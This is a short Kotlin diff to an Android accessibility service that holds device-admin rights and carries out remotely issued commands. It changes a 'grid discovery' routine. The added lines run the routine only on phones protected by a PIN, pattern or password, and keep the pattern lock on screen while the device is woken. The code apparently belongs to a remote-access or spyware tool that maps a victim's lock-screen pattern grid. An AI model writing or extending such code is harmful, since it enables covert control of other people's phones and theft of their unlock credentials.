@@ -2253,6 +2253,14 @@ class MyAccessibilityService : AccessibilityService() {
 
     suspend fun executeMapGridSequence(cmdId: Int, depth: Int) {
         DebugLogger.log("MAP_GRID", "Starting grid discovery sequence...")
+        
+        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
+        if (!km.isKeyguardSecure) {
+            DebugLogger.log("MAP_GRID", "Aborted: Device is insecure (Swipe/None).")
+            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "FAILED_NOT_SECURE", "Device has no PIN/Pattern/Password", null, null)
+            return
+        }
+
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
         val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
         
@@ -2275,6 +2283,7 @@ class MyAccessibilityService : AccessibilityService() {
         val pulseIntent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
             putExtra("is_wake_trigger", true)
+            putExtra("preserve_keyguard", true) // Keep the pattern lock on-screen
         }
         startActivity(pulseIntent)
         delay(1200)
